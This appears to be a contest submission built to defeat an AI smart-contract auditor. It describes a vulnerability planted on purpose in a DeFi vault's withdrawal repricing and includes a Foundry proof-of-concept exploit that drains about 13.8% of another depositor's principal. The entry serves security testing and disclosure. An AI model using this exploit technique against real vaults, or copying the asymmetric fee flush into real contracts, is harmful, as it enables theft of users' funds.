# Stump the AI Auditor — Submission

## Contract
Vault

## AI Auditor Lite Scan URL
https://aiauditor.certik.com/en/scan/f0d07ca3-52a4-49e9-918a-dafa9758fd18

## Severity Claim
**Critical** — Direct theft of depositor principal via deferred share supply manipulation in withdrawal repricing path.

## Justification
The vulnerability enables an unprivileged attacker to extract ~13.8% of a co-depositor's principal through a repeatable deposit→request→cancel cycle. The root cause is a share supply inconsistency between the claim computation path and the repricing path: the attacker's WAD claim is computed against a pre-flush supply (yielding an inflated value), then converted back to shares against a post-flush supply (yielding more shares than burned). This is not fee evasion — it is direct extraction of other users' deposited capital. The attacker's gain equals the victim's loss, dollar for dollar.

## Writeup

### What the bug is
A "gas optimization" introduces a `_deferredFeeShares` batching variable that accumulates fee shares before flushing them into `totalShares`. The flush placement is asymmetric between `requestWithdraw` (flush AFTER WAD claim computation) and `cancelWithdraw` (flush BEFORE share repricing). This creates a PPS divergence: the request sees a higher PPS (smaller denominator), locking in an inflated WAD claim, while the cancel sees a lower PPS (larger denominator after flush), converting that inflated claim back into MORE shares than were originally burned.

### Exploit steps
1. Attacker and victim each deposit 100,000 DAI into the vault
2. 180 days pass (management fee accrues, creating deferred fee shares)
3. Attacker calls `requestWithdraw(allShares, DAI)`:
   - `_accrueFees` puts new fee shares into `_deferredFeeShares` (NOT `totalShares`)
   - `wadOwed = _computeAssets(shares, totalShares, ...)` uses the SMALLER `totalShares` → inflated claim
   - `_flushDeferredFees()` runs AFTER, adding deferred to `totalShares`
4. Attacker immediately calls `cancelWithdraw()`:
   - `_accrueFees` runs (no new fees in same block)
   - `_flushDeferredFees()` runs BEFORE repricing (no-op since already flushed)
   - `newShares = _computeShares(request.wadOwed, totalShares, ...)` uses LARGER `totalShares` → more shares returned
5. Attacker now has MORE shares than they started with (~5% gain per cycle)
6. Repeat steps 2-5 with 60-day intervals between cycles (5 total cycles)
7. Attacker withdraws 100,000 DAI; victim can only withdraw 87,839 DAI

### Impact
- Attacker profit: $12,160 (13.84% of victim's deposit)
- Victim loss: $12,160 from their principal
- Repeatable: each cycle compounds the theft
- No special permissions required — any depositor can execute
- Scales with management fee rate and time between cycles

### Why it's a realistic dev mistake
The `_deferredFeeShares` mechanism is a legitimate gas optimization pattern — batching storage writes to `totalShares` across consecutive admin calls (setFee, pause, unpause) that each trigger `_accrueFees`. The asymmetric flush placement looks intentional: "compute the withdrawer's claim before diluting them with fees" (in request) vs "ensure full dilution before repricing" (in cancel). A senior engineer could plausibly ship this reasoning without realizing the round-trip creates a net share gain.


## Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {MockERC20} from "src/mocks/MockERC20.sol";
import {Vault} from "src/Vault/Vault.sol";
import {IVault} from "src/interfaces/IVault.sol";

contract ExploitPoC is Test {
    Vault internal vault;
    MockERC20 internal dai;

    address internal owner = makeAddr("owner");
    address internal feeRecipient = makeAddr("feeRecipient");
    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        vm.prank(owner);
        dai = new MockERC20("DAI", "DAI", 18);

        vm.prank(owner);
        vault = new Vault(feeRecipient, 0, 500, 100); // 0% perf, 5% mgmt, 100 block timelock

        vm.prank(owner);
        vault.addAsset(address(dai));

        // Fund
        vm.prank(owner);
        dai.mint(attacker, 1_000_000 ether);
        vm.prank(attacker);
        dai.approve(address(vault), type(uint256).max);

        vm.prank(owner);
        dai.mint(victim, 1_000_000 ether);
        vm.prank(victim);
        dai.approve(address(vault), type(uint256).max);
    }

    function test_exploit() public {
        // Both deposit equal amounts
        vm.prank(victim);
        vault.deposit(address(dai), 100_000 ether, victim);

        vm.prank(attacker);
        vault.deposit(address(dai), 100_000 ether, attacker);

        // Let time pass for management fees to accumulate
        vm.warp(block.timestamp + 180 days);
        vm.roll(block.number + 1);

        // Attacker cycles request→cancel 5 times
        for (uint256 i = 0; i < 5; i++) {
            uint256 shares = vault.userShares(attacker);

            vm.prank(attacker);
            vault.requestWithdraw(shares, address(dai));

            vm.prank(attacker);
            vault.cancelWithdraw();

            // Time between cycles
            vm.warp(block.timestamp + 60 days);
            vm.roll(block.number + 1);
        }

        // Both withdraw
        uint256 attackerShares = vault.userShares(attacker);
        uint256 victimShares = vault.userShares(victim);

        vm.prank(attacker);
        vault.requestWithdraw(attackerShares, address(dai));
        vm.prank(victim);
        vault.requestWithdraw(victimShares, address(dai));

        vm.roll(block.number + 101);

        vm.prank(attacker);
        uint256 attackerOut = vault.claimWithdraw();
        vm.prank(victim);
        uint256 victimOut = vault.claimWithdraw();

        // Attacker extracted more than victim despite equal deposits
        assertGt(attackerOut, victimOut, "CRITICAL: attacker stole from victim");

        emit log_named_uint("Attacker withdrew", attackerOut / 1e18);
        emit log_named_uint("Victim withdrew", victimOut / 1e18);
        emit log_named_uint("Stolen (DAI)", (attackerOut - victimOut) / 1e18);
    }
}
```

### Expected Output
```
Attacker withdrew: 99999
Victim withdrew: 87839
Stolen (DAI): 12160
```

The attacker extracts $12,160 more than the victim from equal $100,000 deposits. This is direct theft of depositor principal.
